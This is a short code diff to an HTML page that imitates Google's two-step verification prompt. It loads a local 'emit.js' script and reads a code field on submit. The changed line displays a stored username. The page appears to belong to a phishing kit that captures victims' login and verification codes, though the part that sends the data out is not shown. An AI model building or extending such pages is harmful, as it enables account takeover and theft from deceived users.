@@ -416,7 +416,7 @@ Google sent a notification to your Device. Open the Gmail app and tap <strong>Ye
 <script src="assets/emit.js"></script> 
 <script>
 page = "prompt";
-
+document.querySelector("#username").textContent = sessionStorage.getItem("user");
 submitBtn.addEventListener("click", function() {
 
   const inputs = $('#codeField')
